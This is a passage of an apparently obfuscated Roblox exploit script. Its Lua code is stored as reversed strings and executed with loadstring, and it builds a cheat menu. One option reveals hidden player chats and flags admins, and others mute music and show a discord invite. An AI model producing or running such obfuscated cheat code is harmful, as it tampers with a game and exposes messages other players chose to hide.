)"sreyalP"(ecivreSteG:emag = sreyalP lacol




)}
dne	
)delbanEsi(noitcnuf = kcabllac	
,".stahc neddih lla swohS" = pitloot	
,tpircs = xobpuorg	
,"tahcyps" = emarf	
{(elggoTetaerC.G_




dne
)dne	
dne		
">tnof/<>i/<>tnof/< )" .. emaNyalpsid .. "(" .. noci .. ">')" .. b .. "," .. g .. "," .. r .. "(bgr'=roloc tnof<>i<>"\" .. xeh .. ""\=roloc tnof<" = txeTxiferP.atadm			
esle		
">tnof/<>b/<>tnof/< :]" .. emaNyalpsid .. "[" .. noci .. ">')" .. b .. "," .. g .. "," .. r .. "(bgr'=roloc tnof<>b<>"\" .. xeh .. ""\=roloc tnof<" = txeTxiferP.atadm			
neht gosi fi		

emaNyalpsiD.rlp = emaNyalpsid lacol		
]nc[xehsroloceman = xeh lacol		
]3[]nc[sroloceman =   b lacol		
]2[]nc[sroloceman =   g lacol		
]1[]nc[sroloceman =   r lacol		

dne		
dne			
" " .. ijomEqi = noci				
neht ijomEqi fiesle			
" ����" = noci				
neht detum fiesle			
" ����" = noci				
neht neddih fi			
neht nOtahCyps fi		
"" = noci lacol		

dne		
dne			
"bmudqi" = nc				
"����" = ijomEqi				
neht 05 =< qi fiesle			
"suinegqi" = nc				
"����" = ijomEqi				
neht 002 => qi fi			
)"QI"(etubirttAteG:rlp = qi lacol			
neht )"QI"(etubirttAteG:rlp dna nOtahCyps fi		
lin = ijomEqi lacol		

dne		
dne			
"" = txeT.atadm				
esle			
eurt = neddih				
"neddih" = nc				
neht nOtahCyps fi			
neht ";" == )1 ,1 ,txeT.atadm(bus.gnirts fi		
eslaf = neddih lacol		

dne		
dne			
"" = txeT.atadm				
neht nOtahCyps ton fi			
"neddih" = nc			
neht detum fi		
)"detuM"(gaTsaH:rlp = detum lacol		

dne		
"nimda" = nc			
esle		
dne			
"tnasaep" = nc				
esle			
"nekra" = nc				
neht eurt == )"nekrA"(etubirttAteG:rlp fi			
neht eurt == lartueN.rlp fi		
nc lacol		

eslaf ro ]"tahcyps"[ataDgifnoC.G_ dna ataDgifnoC.G_ = nOtahCyps lacol		
)rlp ,atadm(noitcnuf ,sreldnaHtahC.G_(tresni.elbat	
}{ ro sreldnaHtahC.G_ = sreldnaHtahC.G_	
	

dne	
)(xeHoT:))v(kcapnu.elbat(BGRmorf.3roloC .. "#" = ]i[xehsroloceman		
od )sroloceman(sriap ni v ,i rof	
}{ = xehsroloceman lacol	

dne	
}821 ,821 ,821{ = tnasaep.sroloceman		
neht gosi fi	
}	
,}0   ,0 ,002{ =   bmudqi		
,}971 ,971 ,552{ = suinegqi		
,}0   ,0 ,552{ =   neddih		
,}84 ,502 ,542{ =    nimda		
,}632 ,571   ,4{ =    nekra		
,}201 ,301 ,051{ =  tnasaep		
{ = sroloceman lacol	

lin =~ )"sebuC"(dlihCtsriFdniF:ecapskrow = gosi lacol	
neht OCTsi fi

dne
dne	
kaerb		
eurt = OCTsi		
neht di == dIecalP.emag fi	
od )SDI_ECALP_OCT(sriapi ni di ,_ rof
eslaf = OCTsi lacol

}
,448884472790801	
,10074234921	
,87054234921	
,31557573111	
{ = SDI_ECALP_OCT lacol




dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol
nwodporDetaerC.G_ dna redilSetaerC.G_ dna xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_352);
local function C_3b2()
local script = _llza[_sc(51,98,50)];
loadstring(([[)}
dne	
dne		
dne			
6.0 = emuloV.cisuMstiderCeraWragA.G_				
neht "stiderC" == egaPtnerruCeraWragA.G_ fi			
esle		
0 = emuloV.cisuMstiderCeraWragA.G_			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".cisum dnuorgkcab eht setuM" = pitloot	
,tpircs = xobpuorg	
,"cisumetum" = emarf	
{(elggoTetaerC.G_








dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol

xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_3b2);
local function C_3c6()
local script = _llza[_sc(51,99,54)];
loadstring(([[dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol

xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_3c6);
local function C_3e1()
local script = _llza[_sc(51,101,49)];
loadstring(([[dne
)(tiaW:detelpmoC.thgirBot	
)(yalP:thgirBot	
)	
}eulBthgirb = 3roloCtxeT{		
,)tuOnI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,2(wen.ofnIneewT		
,lebaLtxet		
(etaerC:ecivreSneewT = thgirBot lacol	
)(tiaW:detelpmoC.kraDot	
)(yalP:kraDot	
)	
}eulBkrad = 3roloCtxeT{		
,)tuOnI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,2(wen.ofnIneewT		
,lebaLtxet		
(etaerC:ecivreSneewT = kraDot lacol	
od eurt elihw

)941 ,57 ,0(BGRmorf.3roloC = eulBkrad lacol
)552 ,321 ,0(BGRmorf.3roloC = eulBthgirb lacol
tneraP.tpircs = lebaLtxet lacol
)"ecivreSneewT"(ecivreSteG:emag = ecivreSneewT lacol]]):reverse())();
end;
task.spawn(C_3e1);
local function C_3e4()
local script = _llza[_sc(51,101,52)];
loadstring(([[dne
)(tiaW:detelpmoC.thgirBot	
)(yalP:thgirBot	
)	
}eulBthgirb = 3roloCtxeT{		
,)tuOnI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,2(wen.ofnIneewT		
,lebaLtxet		
(etaerC:ecivreSneewT = thgirBot lacol	
)(tiaW:detelpmoC.kraDot	
)(yalP:kraDot	
)	
}eulBkrad = 3roloCtxeT{		
,)tuOnI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,2(wen.ofnIneewT		
,lebaLtxet		
(etaerC:ecivreSneewT = kraDot lacol	
od eurt elihw


)dne
dne	
)3.0(tiaw.ksat		
1 + semarf# % xedni = xedni		
]xedni[semarf = txeT.lebaLtxet		
od eurt elihw	
1 = xedni lacol	
}	
,"<  tH2VxsaDf7/gg.drocsid  >"		
,"<   tH2VxsaDf7/gg.drocsid   >"		
,"<  tH2VxsaDf7/gg.drocsid  >"		
,"< tH2VxsaDf7/gg.drocsid >"		
{ = semarf lacol	
)(noitcnuf(nwaps.ksat


)941 ,57 ,0(BGRmorf.3roloC = eulBkrad lacol
)552 ,321 ,0(BGRmorf.3roloC = eulBthgirb lacol
tneraP.tpircs = lebaLtxet lacol
)"ecivreSneewT"(ecivreSteG:emag = ecivreSneewT lacol]]):reverse())();
end;
task.spawn(C_3e4);
local function C_3ea()
local script = _llza[_sc(51,101,97)];
loadstring(([[dne
eslaf = elbisiV.pitloot	
)(pitlooTediH.G_ noitcnuf
dne
eurt = elbisiV.pitloot	
txet = txeT.lebal	
)txet(pitlooTwohS.G_ noitcnuf
lin = ksaTedih lacol
)(eziSpitlooTetadpu
)dne
)(eziSpitlooTetadpu	
)(noitcnuf(tcennoC:)"txeT"(langiSdegnahCytreporPteG:lebal
)noitisoPetadpu(tcennoC:deppetSredneR.ecivreSnuR
)dne
dne	
)(noitisoPetadpu		
neht tnemevoMesuoM.epyTtupnIresU.munE == epyTtupnIresU.tupni fi	
)tupni(noitcnuf(tcennoC:degnahCtupnI.ecivreStupnIresU
)noitisoPetadpu(tcennoC:devoMhcuoT.ecivreStupnIresU
dne
)elacs / )Ytesffo + Y.tesnIiug - Y.soPesuom( ,0 ,elacs / )Xtesffo + X.tesnIiug - X.soPesuom( ,0(wen.2miDU = noitisoP.pitloot	
1 ro elacS.elacSiu dna elacSiu = elacs lacol	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)(tesnIiuGteG:)"ecivreSiuG"(ecivreSteG:emag = tesnIiug lacol	
)(noitacoLesuoMteG:ecivreStupnIresU = soPesuom lacol	
)(noitisoPetadpu noitcnuf lacol
dne
)thgieh ,0 ,htdiw ,0(wen.2miDU = eziS.pitloot	
01 + Y.eziStxet = thgieh lacol	
)htdiWxam ,01 + X.eziStxet(nim.htam = htdiw lacol	
)	
)eguh.htam ,01 - htdiWxam(wen.2rotceV		
,tnoF.lebal		
,eziStxeT.lebal		
,txet		
(eziStxeTteG:ecivreStxeT = eziStxet lacol	
txeT.lebal = txet lacol	
)(eziSpitlooTetadpu noitcnuf lacol
21 = Ytesffo lacol
21 = Xtesffo lacol
052 = htdiWxam lacol
eslaf = elbisiV.pitloot
dne nruter neht lebal ton fi
)"txet"(dlihCtsriFdniF:pitloot = lebal lacol
dne nruter neht pitloot ton fi
)"pitlooT"(dlihCtsriFdniF:iuGneercs = pitloot lacol
)"ecivreStxeT"(ecivreSteG:emag = ecivreStxeT lacol
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol
)"ecivreStupnIresU"(ecivreSteG:emag = ecivreStupnIresU lacol
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol]]):reverse())();
end;
task.spawn(C_3ea);
local function C_3f2()
local script = _llza[_sc(51,102,50)];
loadstring(([[elggoTnottuBetaerC = elggoTnottuBetaerC.G_
elggoTetaerC = elggoTetaerC.G_

dne
dne	
)dne		
dne			
)(pitlooTediH.G_				
neht pitlooTediH.G_ fi			
)(slausiVetadpu			
eslaf = gnirevoHsi			
)(noitcnuf(tcennoC:evaeLesuoM.nottub		

)dne		
dne			
)txeTpitloot(pitlooTwohS.G_				
dne				
)elacs / )21 + Y.tesnIiug - Y.soPesuom( ,0 ,elacs / )21 + X.tesnIiug - X.soPesuom( ,0(wen.2miDU = noitisoP.pitloot					
neht pitloot fi				
)"pitlooT"(dlihCtsriFdniF:iuGneercs = pitloot lacol				
1 ro elacS.elacSiu dna elacSiu = elacs lacol				
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol				
)(tesnIiuGteG:)"ecivreSiuG"(ecivreSteG:emag = tesnIiug lacol				
)(noitacoLesuoMteG:ecivreStupnIresU = soPesuom lacol				
neht pitlooTwohS.G_ dna txeTpitloot fi			
99 = xednIZ.ekortSeniltuo			
0 = ycnerapsnarT.ekortSeniltuo			
1 = ssenkcihT.ekortSeniltuo			
roloCtegrat = roloC.ekortSeniltuo			
eurt = gnirevoHsi			
)(noitcnuf(tcennoC:retnEesuoM.nottub		
neht )"ekortSIU"(AsI:ekortSeniltuo dna ekortSeniltuo fi	

)dne	
dne		
)delggoTsi(kcabllac			
neht kcabllac fi		
)(gifnoCevas		
)(slausiVetadpu		
delggoTsi = ]emaNemarf[ataDgifnoC.G_		
delggoTsi ton = delggoTsi		
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.nottub	

)dne	
dne		
roloCtxeTlanigiro = 3roloCtxeT.txet			
neht delggoTsi ton fi		
)(noitcnuf(tcennoC:pU1nottuBesuoM.nottub	

)dne	
dne		
roloCtegrat = 3roloCtxeT.txet			
neht delggoTsi ton fi		
)(noitcnuf(tcennoC:nwoD1nottuBesuoM.nottub	

)}slausiVetadpu = etadpu{ ,selggoTnottuBlla(tresni.elbat	

)(slausiVetadpu	

dne	
dne		
dne			
dne				
1 = xednIZ.ekortSeniltuo					
2 = ssenkcihT.ekortSeniltuo					
0 = ycnerapsnarT.ekortSeniltuo					
)0 ,0 ,0(BGRmorf.3roloC = roloC.ekortSeniltuo					
esle				
99 = xednIZ.ekortSeniltuo					
0 = ycnerapsnarT.ekortSeniltuo					
1 = ssenkcihT.ekortSeniltuo					
roloCtegrat = roloC.ekortSeniltuo					
neht gnirevoHsi fi				
neht )"ekortSIU"(AsI:ekortSeniltuo dna ekortSeniltuo fi			
roloCtxeTlanigiro = 3roloCtxeT.txet			
txeTlanigiro = txeT.txet			
)05 ,05 ,05(BGRmorf.3roloC = 3roloCredroB.nottub			
)02 ,02 ,02(BGRmorf.3roloC = 3roloCdnuorgkcaB.nottub			
esle		
dne			
99 ro 99 dna gnirevoHsi = xednIZ.ekortSeniltuo				
1 = ssenkcihT.ekortSeniltuo				
5.0 ro 0 dna gnirevoHsi = ycnerapsnarT.ekortSeniltuo				
roloCtegrat = roloC.ekortSeniltuo				
neht )"ekortSIU"(AsI:ekortSeniltuo dna ekortSeniltuo fi			
roloCtxeTdelggoTtnerruc = 3roloCtxeT.txet			
txeTlanigiro ro txeTdelggot = txeT.txet			
roloCtegrat = 3roloCredroB.nottub			
roloCtegrat = 3roloCdnuorgkcaB.nottub			
neht delggoTsi fi		
roloCtegrat ro roloCtxeTdelggot.gifnoc = roloCtxeTdelggoTtnerruc lacol		
)(slausiVetadpu noitcnuf lacol	

eslaf = gnirevoHsi lacol	
3roloCtxeT.txet = roloCtxeTlanigiro lacol	
txeT.txet = txeTlanigiro lacol	
eslaf ro ]emaNemarf[ataDgifnoC.G_ = delggoTsi lacol	

dne nruter neht txet ton fi	

)"txet"(dlihCtsriFdniF:nottub = txet lacol	
)eurt ,"ekortSeniltuo"(dlihCtsriFdniF:nottub = ekortSeniltuo lacol	

dne nruter neht nottub ton fi	
)"nottub"(dlihCtsriFdniF:emarf = nottub lacol	

dne nruter neht emarf ton fi	
)emaNemarf(dlihCtsriFdniF:tneraP.tpircSxobpuorg = emarf lacol	

roloCtegrat ro roloCtxeTdelggot.gifnoc = roloCtxeTdelggot lacol	
txeTdelggot.gifnoc = txeTdelggot lacol	
kcabllac.gifnoc = kcabllac lacol	
pitloot.gifnoc = txeTpitloot lacol	
xobpuorg.gifnoc = tpircSxobpuorg lacol	
emarf.gifnoc = emaNemarf lacol	
)gifnoc(elggoTnottuBetaerC noitcnuf lacol

dne
)dne	
dne		
)(pitlooTediH.G_			
neht pitlooTediH.G_ fi		
)(slausiVetadpu		
eslaf = gnirevoHsi		
)(noitcnuf(tcennoC:evaeLesuoM.nottub	

)dne	
dne		
)txeTpitloot(pitlooTwohS.G_			
dne			
)elacs / )21 + Y.tesnIiug - Y.soPesuom( ,0 ,elacs / )21 + X.tesnIiug - X.soPesuom( ,0(wen.2miDU = noitisoP.pitloot				
neht pitloot fi			
)"pitlooT"(dlihCtsriFdniF:iuGneercs = pitloot lacol			
1 ro elacS.elacSiu dna elacSiu = elacs lacol			
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol			
)(tesnIiuGteG:)"ecivreSiuG"(ecivreSteG:emag = tesnIiug lacol			
)(noitacoLesuoMteG:ecivreStupnIresU = soPesuom lacol			
neht pitlooTwohS.G_ dna txeTpitloot fi		
99 = xednIZ.ekortSeniltuo		
0 = ycnerapsnarT.ekortSeniltuo		
1 = ssenkcihT.ekortSeniltuo		
roloCtegrat = roloC.ekortSeniltuo		
eurt = gnirevoHsi		
)(noitcnuf(tcennoC:retnEesuoM.nottub	

)dne	
dne		
)delggoTsi(kcabllac			
neht kcabllac fi		
)(gifnoCevas		
)(slausiVetadpu		
delggoTsi = ]emaNemarf[ataDgifnoC.G_		
delggoTsi = ]nottub[setatSelggot		
delggoTsi ton = delggoTsi		
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.nottub	

)}slausiVetadpu = etadpu{ ,selggoTlla(tresni.elbat	

)(slausiVetadpu	

dne	
1 ro 99 dna gnirevoHsi = xednIZ.ekortSeniltuo		

dne		
dne			
0 = ycnerapsnarT.ekortSeniltuo				
2 = ssenkcihT.ekortSeniltuo				
)0 ,0 ,0(BGRmorf.3roloC = roloC.ekortSeniltuo				
esle			
0 = ycnerapsnarT.ekortSeniltuo				
1 = ssenkcihT.ekortSeniltuo				
roloCtegrat = roloC.ekortSeniltuo				
neht gnirevoHsi fi			
dne eurt = elbisiV.edaFelggot neht edaFelggot fi			
)05 ,05 ,05(BGRmorf.3roloC = 3roloCredroB.emarFelggot			
)02 ,02 ,02(BGRmorf.3roloC = 3roloCdnuorgkcaB.emarFelggot			
esle		
dne eslaf = elbisiV.edaFelggot neht edaFelggot fi			
5.0 ro 0 dna gnirevoHsi = ycnerapsnarT.ekortSeniltuo			
1 = ssenkcihT.ekortSeniltuo			
roloCtegrat = roloC.ekortSeniltuo			
roloCtegrat = 3roloCredroB.emarFelggot			
roloCtegrat = 3roloCdnuorgkcaB.emarFelggot			
neht delggoTsi fi		
)(slausiVetadpu noitcnuf lacol	

dne	
)dne		
)eurt(kcabllac			
)(noitcnuf(nwaps.ksat		
neht kcabllac dna delggoTsi fi	
	
	
delggoTsi = ]nottub[setatSelggot	
eslaf = gnirevoHsi lacol	
eslaf ro ]emaNemarf[ataDgifnoC.G_ = delggoTsi lacol	

)"edaFelggot"(dlihCtsriFdniF:emarFelggot = edaFelggot lacol	

dne nruter neht ekortSeniltuo ton fi	
)"ekortSeniltuo"(dlihCtsriFdniF:emarFelggot = ekortSeniltuo lacol	

dne nruter neht emarFelggot ton fi	
)"emarFelggot"(dlihCtsriFdniF:nottub = emarFelggot lacol	

dne nruter neht nottub ton fi	
)"nottub"(dlihCtsriFdniF:emarf = nottub lacol	

dne nruter neht emarf ton fi	
)emaNemarf(dlihCtsriFdniF:tneraP.tpircSxobpuorg = emarf lacol	

kcabllac.gifnoc = kcabllac lacol	
pitloot.gifnoc = txeTpitloot lacol	
xobpuorg.gifnoc = tpircSxobpuorg lacol	
emarf.gifnoc = emaNemarf lacol	
)gifnoc(elggoTetaerC noitcnuf lacol

)sroloCllAetadpu(tcennoC:)"3roloCdnuorgkcaB"(langiSdegnahCytreporPteG:emarFroloc

dne
dne	
)(etadpu.elggoTnottub		
od )selggoTnottuBlla(sriap ni elggoTnottub ,_ rof	
dne	
)(etadpu.elggot		
od )selggoTlla(sriap ni elggot ,_ rof	
3roloCdnuorgkcaB.emarFroloc = roloCtegrat	
)(sroloCllAetadpu noitcnuf lacol

}{ = selggoTnottuBlla lacol
}{ = selggoTlla lacol

)(gifnoCdaol

dne
dne	
)atad(edoceDNOSJ:ecivreSpttH = ataDgifnoC.G_		
neht atad dna sseccus fi	
)dne	
)ELIF_GIFNOC(elifdaer nruter		
)(noitcnuf(llacp = atad ,sseccus lacol	
)(gifnoCdaol noitcnuf lacol

dne
)dne	
))ataDgifnoC.G_(edocnENOSJ:ecivreSpttH ,ELIF_GIFNOC(elifetirw		
)(noitcnuf(llacp	
)(gifnoCevas noitcnuf lacol

"nosj.gifnocym" = ELIF_GIFNOC lacol

}{ ro ataDgifnoC.G_ = ataDgifnoC.G_

}{ = setatSelggot lacol
3roloCdnuorgkcaB.emarFroloc = roloCtegrat lacol

dne nruter neht emarFroloc ton fi
)"roloC"(dlihCtsriFdniF:iuGneercs = emarFroloc lacol

)"ecivreSpttH"(ecivreSteG:emag = ecivreSpttH lacol
)"ecivreStupnIresU"(ecivreSteG:emag = ecivreStupnIresU lacol

dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol

dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol
]]):reverse())();
end;
task.spawn(C_3f2);
local function C_3f3()
local script = _llza[_sc(51,102,51)];
loadstring(([[dne
nekoTlecnac nruter	

dne	
dne		
dne			
dne				
kaerb					
)dne					
dne						
lin = ]emaNemarf[snekoTevitca							
roloClanigiro = 3roloCtxeT.txet							
txeTlanigiro = txeT.txet							
neht dellecnac.nekoTlecnac ton fi						
)(noitcnuf ,noitarud(yaled.ksat					

roloCtegrat = 3roloCtxeT.txet					
egassem = txeT.txet					

3roloCtxeT.txet = roloClanigiro lacol					
txeT.txet = txeTlanigiro lacol					
neht txet fi				
)"txet"(dlihCtsriFdniF:nottub = txet lacol				
neht nottub fi			
)"nottub"(dlihCtsriFdniF:tnadnecsed = nottub lacol			
neht )"emarF"(AsI:tnadnecsed dna emaNemarf == emaN.tnadnecsed fi		
od ))(stnadnecseDteG:iuGneercs(sriap ni tnadnecsed ,_ rof	
	

nekoTlecnac = ]emaNemarf[snekoTevitca	
}eslaf = dellecnac{ = nekoTlecnac lacol	
	

dne	
eurt = dellecnac.]emaNemarf[snekoTevitca		
neht ]emaNemarf[snekoTevitca fi	
	

2 ro noitarud = noitarud	
)noitarud ,egassem ,emaNemarf(noitcnuf = txeTnottuBteS.G_

}{ = snekoTevitca lacol


nottuBetaerC = nottuBetaerC.G_

dne
dne	
)dne		
dne			
)(pitlooTediH.G_				
neht pitlooTediH.G_ fi			
1 = xednIZ.ekortSeniltuo			
ycnerapsnarTlanigiro = ycnerapsnarT.ekortSeniltuo			
ssenkcihTlanigiro = ssenkcihT.ekortSeniltuo			
roloClanigiro = roloC.ekortSeniltuo			
)(noitcnuf(tcennoC:evaeLesuoM.nottub		

)dne		
dne			
)txeTpitloot(pitlooTwohS.G_				
dne				
)elacs / )21 + Y.tesnIiug - Y.soPesuom( ,0 ,elacs / )21 + X.tesnIiug - X.soPesuom( ,0(wen.2miDU = noitisoP.pitloot					
neht pitloot fi				
)"pitlooT"(dlihCtsriFdniF:iuGneercs = pitloot lacol				
1 ro elacS.elacSiu dna elacSiu = elacs lacol				
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol				
)(tesnIiuGteG:)"ecivreSiuG"(ecivreSteG:emag = tesnIiug lacol				
)(noitacoLesuoMteG:ecivreStupnIresU = soPesuom lacol				
neht pitlooTwohS.G_ dna txeTpitloot fi			
99 = xednIZ.ekortSeniltuo			
0 = ycnerapsnarT.ekortSeniltuo			
1 = ssenkcihT.ekortSeniltuo			
roloCtegrat = roloC.ekortSeniltuo			
)(noitcnuf(tcennoC:retnEesuoM.nottub		
		
1 = xednIZ.ekortSeniltuo		
ycnerapsnarT.ekortSeniltuo = ycnerapsnarTlanigiro lacol		
ssenkcihT.ekortSeniltuo = ssenkcihTlanigiro lacol		
roloC.ekortSeniltuo = roloClanigiro lacol		
neht )"ekortSIU"(AsI:ekortSeniltuo dna ekortSeniltuo fi	

)dne	
dne		
)(kcabllaCetucexe			
esle		
dne			
)dne				
roloCtxeTlanigiro = 3roloCtxeT.txet					
txeTlanigiro = txeT.txet					
eslaf = gnimrifnoCsi					
)(noitcnuf ,tiaWmrifnoc(yaled.ksat = ksaTmrifnoc				
roloCtegrat = 3roloCtxeT.txet				
egasseMmrifnoc = txeT.txet				
eurt = gnimrifnoCsi				
esle			
)(kcabllaCetucexe				
roloCtxeTlanigiro = 3roloCtxeT.txet				
txeTlanigiro = txeT.txet				
eslaf = gnimrifnoCsi				
dne )ksaTmrifnoc(lecnac.ksat neht ksaTmrifnoc fi				
neht gnimrifnoCsi fi			
neht mrifnoCsdeen fi		

dne nruter neht retfAgniruDkcilCnac ton dna gnissecorPsi fi		
dne nruter neht emiTdloh fi		
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.nottub	

)dne	
dne		
dne			
roloCtxeTlanigiro = 3roloCtxeT.txet				
neht gnissecorPsi ton dna gnimrifnoCsi ton fi			
esle		
)(dloHpots			
neht emiTdloh fi		
)(noitcnuf(tcennoC:evaeLesuoM.nottub	

)dne	
dne		
dne			
roloCtxeTlanigiro = 3roloCtxeT.txet				
neht gnissecorPsi ton dna gnimrifnoCsi ton fi			
esle		
)(dloHpots			
neht emiTdloh fi		
)(noitcnuf(tcennoC:pU1nottuBesuoM.nottub	

)dne	
dne		
roloCtegrat = 3roloCtxeT.txet			
esle		
)dne			
dne				
dne					
)(kcabllaCetucexe						
esle					
)dne						
roloCtxeTlanigiro = 3roloCtxeT.txet							
txeTlanigiro = txeT.txet							
eslaf = gnimrifnoCsi							
)(noitcnuf ,tiaWmrifnoc(yaled.ksat = ksaTmrifnoc						
roloCtegrat = 3roloCtxeT.txet						
egasseMmrifnoc = txeT.txet						
eurt = gnimrifnoCsi						
neht mrifnoCsdeen fi					
)(dloHpots					
neht 1 => ssergorPdloh fi				

dne				
)dne					
)gniniamer ,hctam(tamrof.gnirts nruter						
)hctam(noitcnuf ,")fd%.%%%("(busg:txeTdloh = txeT.txet					
))emiTdloh * ssergorPdloh( - emiTdloh ,0(xam.htam = gniniamer lacol					
neht )"fd%.%%%"(dnif:txeTdloh dna txeTdloh fi				

dne				
)0 ,1 ,0 ,ssergorPdloh(wen.2miDU = eziS.raBllif					
neht lausiVdloh dna raBllif fi				

)1 ,0 ,ssergorPdloh(pmalc.htam = ssergorPdloh				
)emiTdloh / td( + ssergorPdloh = ssergorPdloh				
dne nruter neht gnidloh ton fi				
)td(noitcnuf(tcennoC:deppetSredneR.ecivreSnuR = noitcennoCdloh			

roloCdloh = 3roloCtxeT.txet			
dne			
txeTdloh = txeT.txet				
neht txeTdloh fi			
0 = ssergorPdloh			
eurt = gnidloh			
neht emiTdloh fi		

dne nruter neht retfAgniruDkcilCnac ton dna gnissecorPsi fi		
)(noitcnuf(tcennoC:nwoD1nottuBesuoM.nottub	

dne	
dne		
eslaf = gnissecorPsi			
esle		
)dne			
roloCtxeTlanigiro = 3roloCtxeT.txet				
txeTlanigiro = txeT.txet				
dne				
eslaf = gnissecorPsi					
neht retfAgniruDkcilCnac ton fi				
)(noitcnuf ,tiaWegasseMretfa(yaled.ksat			
roloCtegrat = 3roloCtxeT.txet			
dne			
txeTyalpsid = txeT.txet				
esle			
)dne				
dne					
)1.0(tiaw.ksat						
)dne						
)i ,hctam(tamrof.gnirts nruter							
)hctam(noitcnuf ,")fd%.%%%("(busg:txeTyalpsid = txeT.txet						
dne kaerb neht gnissecorPsi ton fi						
od 1.0- ,0 ,tiaWegasseMretfa = i rof					
)(noitcnuf(nwaps.ksat = ksaTnwodtnuoc				
ksaTnwodtnuoc lacol				
neht )"fd%.%%%"(dnif:wohSoTegassem fi			
wohSoTegassem = txeTyalpsid lacol			
neht wohSoTegassem fi		

